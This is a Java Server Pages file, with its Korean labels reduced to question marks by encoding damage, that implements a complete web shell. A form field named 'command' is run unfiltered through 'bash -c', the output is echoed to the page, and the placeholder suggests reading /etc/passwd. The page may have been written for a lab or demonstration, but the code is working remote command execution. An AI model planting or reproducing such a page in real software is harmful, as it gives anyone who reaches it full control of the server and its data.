<%@ page import="java.io.BufferedReader, java.io.InputStreamReader, java.io.IOException" %>
<%@ page contentType="text/html; charset=UTF-8" %>
<html>
<head>
    <title>OS ??? ??</title>
</head>
<body>
    <h2>???? ??? ??</h2>
    <form method="post" action="command.jsp">
        <label for="command">???:</label>
        <input type="text" id="command" name="command" placeholder="ex) ls, cat /etc/passwd" size="50" />
        <button type="submit">??</button>
    </form>

    <h3>??? ?? ??:</h3>
    <pre>
    <%
        String command = request.getParameter("command");

        if (command != null && !command.trim().isEmpty()) {
            try {
                // ??? ??
                ProcessBuilder builder = new ProcessBuilder();
                // cd, ./bash.sh ?? ???? ?? ???? ?? ?? ???? ???, ??? ??
                builder.command("bash", "-c", command);

                Process process = builder.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                
                String line;
                while ((line = reader.readLine()) != null) {
                    out.println(line);
                }
                while ((line = errorReader.readLine()) != null) {
                    out.println(line);
                }

                // ???? ?? ??
                int exitCode = process.waitFor();
                out.println("??? ?? ??: " + exitCode);
            } catch (IOException | InterruptedException e) {
                out.println("??? ?? ? ?? ??: " + e.getMessage());
            }
        } else {
            out.println("???? ??????.");
        }
    %>
    </pre>
</body>
</html>

